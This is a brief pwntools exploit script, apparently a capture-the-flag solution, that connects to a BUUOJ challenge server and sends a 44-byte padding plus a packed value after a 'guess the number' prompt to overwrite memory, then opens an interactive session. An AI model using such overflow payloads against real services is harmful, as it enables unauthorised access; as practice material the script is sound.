from pwn import *

# io = process("./pwn")
io = remote('node4.buuoj.cn', 26735)

io.sendlineafter(b'Let\'s guess the number', cyclic(44) + p32(0x41348000))

io.interactive()